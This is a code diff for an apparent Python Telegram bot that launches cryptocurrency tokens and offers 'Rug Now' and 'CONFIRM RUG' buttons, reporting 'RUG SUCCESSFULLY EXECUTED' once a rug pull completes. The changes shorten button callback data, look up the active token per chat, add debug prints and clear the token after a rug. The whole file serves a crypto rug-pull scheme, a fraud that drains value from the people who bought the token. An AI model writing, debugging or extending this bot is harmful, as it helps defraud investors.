@@ -97,11 +97,11 @@ def handle_launch(message):
             # Store active token for this chat
             active_token[message.chat.id] = mint
             
-            # Create action buttons
+            # Create action buttons (use short callbacks, mint stored in active_token)
             markup = types.InlineKeyboardMarkup()
             markup.row(
-                types.InlineKeyboardButton("Monitor", callback_data=f"monitor_{mint}"),
-                types.InlineKeyboardButton("Rug Now", callback_data=f"rug_{mint}")
+                types.InlineKeyboardButton("Monitor", callback_data="monitor_active"),
+                types.InlineKeyboardButton("Rug Now", callback_data="rug_active")
             )
             markup.row(
                 types.InlineKeyboardButton("Check Wallets", callback_data="wallets"),
@@ -116,6 +116,7 @@ def handle_launch(message):
             )
             
             bot.reply_to(message, success_text, reply_markup=markup)
+            print(f"[DEBUG] Sent success message with 4 buttons to chat {message.chat.id}")
             
             # Auto-start monitoring (essential, not optional)
             try:
@@ -407,11 +408,11 @@ def handle_callback(call):
                     # Store active token
                     active_token[chat_id] = mint
                     
-                    # Create action buttons
+                    # Create action buttons (use short callbacks)
                     markup = types.InlineKeyboardMarkup()
                     markup.row(
-                        types.InlineKeyboardButton("Monitor", callback_data=f"monitor_{mint}"),
-                        types.InlineKeyboardButton("Rug Now", callback_data=f"rug_{mint}")
+                        types.InlineKeyboardButton("Monitor", callback_data="monitor_active"),
+                        types.InlineKeyboardButton("Rug Now", callback_data="rug_active")
                     )
                     markup.row(
                         types.InlineKeyboardButton("Check Wallets", callback_data="wallets"),
@@ -426,6 +427,7 @@ def handle_callback(call):
                     )
                     
                     bot.send_message(chat_id, success_text, reply_markup=markup)
+                    print(f"[DEBUG] Sent success message with 4 buttons to chat {chat_id}")
                     
                     # Auto-start monitoring
                     try:
@@ -456,20 +458,30 @@ def handle_callback(call):
             handle_status_check(chat_id)
         
         # Monitor button
-        elif data.startswith("monitor_"):
-            mint = data.replace("monitor_", "")
+        elif data == "monitor_active":
+            if chat_id not in active_token:
+                bot.answer_callback_query(call.id, "[ERROR] No active token")
+                bot.send_message(chat_id, "[ERROR] No active token found. Launch a token first!")
+                return
+            
+            mint = active_token[chat_id]
             bot.answer_callback_query(call.id, f"Monitoring {mint[:8]}...")
             bot.send_message(chat_id, f"[MONITOR] Monitoring active for {mint}")
         
         # Rug button
-        elif data.startswith("rug_"):
-            mint = data.replace("rug_", "")
-            bot.answer_callback_query(call.id, "[WARNING] Executing rug...")
+        elif data == "rug_active":
+            if chat_id not in active_token:
+                bot.answer_callback_query(call.id, "[ERROR] No active token")
+                bot.send_message(chat_id, "[ERROR] No active token found. Launch a token first!")
+                return
+            
+            mint = active_token[chat_id]
+            bot.answer_callback_query(call.id, "[WARNING] Confirm rug...")
             
             # Confirmation markup
             confirm_markup = types.InlineKeyboardMarkup()
             confirm_markup.row(
-                types.InlineKeyboardButton("CONFIRM RUG", callback_data=f"rug_confirm_{mint}"),
+                types.InlineKeyboardButton("CONFIRM RUG", callback_data="rug_confirm_active"),
                 types.InlineKeyboardButton("Cancel", callback_data="cancel")
             )
             
@@ -480,8 +492,13 @@ def handle_callback(call):
             )
         
         # Rug confirmation
-        elif data.startswith("rug_confirm_"):
-            mint = data.replace("rug_confirm_", "")
+        elif data == "rug_confirm_active":
+            if chat_id not in active_token:
+                bot.answer_callback_query(call.id, "[ERROR] No active token")
+                bot.send_message(chat_id, "[ERROR] No active token found. Launch a token first!")
+                return
+            
+            mint = active_token[chat_id]
             bot.answer_callback_query(call.id, "Rugging...")
             bot.send_message(chat_id, f"[RUG] Executing for {mint}...")
             
@@ -489,6 +506,8 @@ def handle_callback(call):
             
             if success:
                 bot.send_message(chat_id, f"[OK] RUG SUCCESSFULLY EXECUTED {mint}")
+                # Clear active token after rug
+                del active_token[chat_id]
             else:
                 bot.send_message(chat_id, f"[ERROR] Rug failed for {mint}")
         
